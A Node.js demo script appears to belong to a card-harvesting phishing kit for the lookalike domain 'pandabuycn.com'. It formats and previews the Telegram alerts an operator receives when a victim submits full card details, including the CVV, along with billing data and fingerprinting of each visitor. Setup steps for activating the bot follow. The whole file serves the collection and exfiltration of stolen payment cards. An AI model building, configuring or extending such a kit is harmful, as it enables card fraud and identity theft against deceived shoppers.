// Test script to show the new enhanced card notification format
// This demonstrates what your Telegram notifications will look like

const TelegramBot = require('./telegram-bot.js');

// Sample card data that would be sent when someone fills out your form
const sampleCardData = {
  // Card information
  cardNumber: '4532123456789012',
  cardName: 'John Smith',
  expMonth: '12',
  expYear: '26',
  cvv: '456',
  
  // Customer billing information
  email: 'customer@example.com',
  phoneNumber: '+1-555-0123',
  billingAddress: '456 Oak Street, Apt 2B',
  city: 'Los Angeles',
  state: 'CA',
  zipCode: '90210',
  country: 'United States',
  
  // Server timestamps
  serverTimestamp: new Date().toISOString(),
  submissionDate: new Date().toLocaleDateString(),
  submissionTime: new Date().toLocaleTimeString(),
  domain: 'pandabuycn.com',
  
  // Enhanced visitor data (automatically collected)
  visitorData: {
    ip: '203.0.113.45',
    browser: {
      name: 'Chrome',
      version: '120.0.6099.109'
    },
    os: {
      name: 'Windows 11'
    },
    device: {
      type: 'Desktop',
      model: 'Unknown'
    },
    screen: {
      resolution: '1920x1080',
      colorDepth: 24
    },
    locale: {
      timezone: 'America/Los_Angeles',
      language: 'en-US'
    },
    geoLocation: {
      country: 'United States',
      city: 'Los Angeles'
    },
    network: {
      connectionType: 'wifi',
      downlink: 10
    }
  }
};

// Create a bot instance (won't actually send, just format the message)
const bot = new TelegramBot('dummy_token', 'dummy_chat');

console.log('🚨 NEW CARD NOTIFICATION FORMAT FOR PANDABUYCN.COM 🚨');
console.log('='.repeat(60));
console.log('');
console.log('This is what you\'ll receive in Telegram when someone submits a card:');
console.log('');
console.log('─'.repeat(60));

// Format and display the message
const formattedMessage = bot.formatCardMessage(sampleCardData);
console.log(formattedMessage);

console.log('─'.repeat(60));
console.log('');
console.log('✨ KEY FEATURES:');
console.log('• 🚨 Instant "NEW CARD!" alert with date/time');
console.log('• 🌐 Shows your domain: pandabuycn.com');
console.log('• 💳 Enhanced card brand detection (Visa, Mastercard, Amex, etc.)');
console.log('• 👤 Complete customer information');
console.log('• 🔍 Detailed visitor tracking (IP, browser, OS, device, timezone)');
console.log('• 📱 Mobile-friendly formatting with emojis');
console.log('• 🔗 Direct link to your admin panel');
console.log('');
console.log('🔧 AUTOMATIC FEATURES:');
console.log('• ⚡ Sends immediately when form is submitted');
console.log('• 📊 Captures all visitor data automatically');
console.log('• 🛡️ Secure - only you receive the notifications');
console.log('• 📱 Works on mobile and desktop Telegram');
console.log('');
console.log('🚀 TO ACTIVATE:');
console.log('1. Run: ./setup-telegram.sh');
console.log('2. Get your bot token from @BotFather');
console.log('3. Get your chat ID from @userinfobot');
console.log('4. Edit config.local.js with your credentials');
console.log('5. Restart server: node server.js');
console.log('6. Test: http://localhost:3000/test-telegram');
console.log('');
console.log('💡 Once configured, you\'ll get notifications like this for EVERY card submission!'); 